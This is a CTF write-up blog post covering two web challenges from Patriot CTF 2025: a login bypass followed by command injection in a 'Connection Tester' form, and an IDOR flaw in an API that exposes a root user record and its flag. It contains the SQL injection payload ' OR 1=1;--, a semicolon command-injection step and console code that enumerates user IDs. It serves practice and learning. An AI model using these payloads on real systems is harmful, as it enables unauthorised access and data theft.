---
title: "Patriot CTF 2025: Web Challenges"
date: 2025-12-13T10:00:00+0200
draft: false
tags: ["ctf", "web"]
categories: ["writeups"]
summary: "Writeups for Patriot CTF 2025's Connection Tester SQLi chain and Trust Fall IDOR/API issues."
---

# Challenge: `Connection Tester` 

## Analysis & Exploit

This is a classic **SQLI (SQL Injection)** challenge followed by a web shell.

![Login page](/assets/Pasted%20image%2020251122030709.png)

First thing is this login page. The first that goes in mind is to try a blind SQLI for the fun.
Running ```' OR 1=1;--``` as the username and just a fake password redirects as us an admin user! yay!

![Connectivity tool panel](/assets/Pasted%20image%2020251122030851.png)

We are welcomed by this panel, not really interesting, but as a 'open connectivity tool' button. Let's press it!

![Connectivity tester form](/assets/Pasted%20image%2020251122030925.png)

This is the final page. It's supposed to be a tool that connects to an IP, but when entering any ip it just shows a static message. 
So, I tried fuzzing the input. Eventually, when entering a semicolon i finally saw another message:

![Webshell response](/assets/Pasted%20image%2020251122031225.png)

A webshell! amazing.
Let's try a simple ls and cat:

![Flag output](/assets/Pasted%20image%2020251122031302.png)

Here's the flag! easy one.

# Challenge: `Trust Fall`

This is a classic **IDOR (Insecure Direct Object Reference)** challenge with a combination of **Insecure Auth Missconfiguration** and hidden API routes. For me, it was a common thing to fuzz around the website, as it should be.

## Analysis

I was presented a login-page, with weird placeholders applied to the inputs:

![Trust Fall login page](/assets/Pasted%20image%2020251122032039.png)

First thing I tried was trying these as the input, and as expected it worked!

The rest of the challenge was easy, but confusing. 
The next source is applied to the website's html:

```js
const AUTH_TOKEN = 'trustfall-readonly';

const ... = ...;
const ... = ...;
const ... = ...;

async function fetchJson(url, options = {}) {
  const response = await fetch(url, {
    credentials: 'same-origin',
    ...options,
    headers: {
      ...(options.headers || {}),
      Authorization: `Bearer ${AUTH_TOKEN}`
    }
  });

  if (!response.ok) {
    throw new Error(`Request failed with status ${response.status}`);
  }

  return response.json();
}

```

#### Notes:
- `AUTH_TOKEN` is a constant that is used to authorize our request
- it's value is a readonly token, meaning we only have readonly perms (we cannot remove or update data by the rest api)

Fuzzing the `AUTH_TOKEN` was the instant reaction for me, and so I tried editing it's value to `trustfall-admin`, `trustfall-readwrite`, `trustfall-administrator`, etc.. Having no positive response and only **401 (Unauthorized)**.

Moving on, the website is requesting `/api/products` from the server, and also, it requests `/api/products/<id>`. 
Let's look at the **JSON** response:

```json
[
    {
        "sku": "GL-404",
        "name": "Ghostlight Lantern",
        "price": 59,
        "updatedBy": 1
    },
    {
        "sku": "MN-1337",
        "name": "Morning Nebula Mug",
        "price": 24.5,
        "updatedBy": 2
    },
    {
        "sku": "SB-001",
        "name": "Skybridge Backpack",
        "price": 129.99,
        "updatedBy": 1
    }
]
```

`updatedBy` field is the interesting part! it shows the ID of the user who edited the product!
Automatically I went on trying to find `/api/users`, which failed.
But let's test `/api/users/1`:

`fetchJson("/api/users/1")` ->
```json
{"id":1,"username":"inventory-analyst","role":"inventory","flag":null}
```

Great! now let's try the other user:

```json
{"id":2,"username":"merchandising-bot","role":"automation","flag":null}
```

Oh, okay. Easy, let's try user `0`:

```json
{
    "id": 0,
    "username": "root",
    "role": "superuser",
    "flag": "PCTF{authz_misconfig_owns_u}"
}
```

We found the flag. Yippey!!!

## Exploit

I was just using the given `fetchJson` function. So, running from the chrome console:

```js
const req = await fetchJson('/api/users/0');
console.log(req); // {id: 0, username: 'root', role: 'superuser', flag: 'PCTF{authz_misconfig_owns_u}'}
```
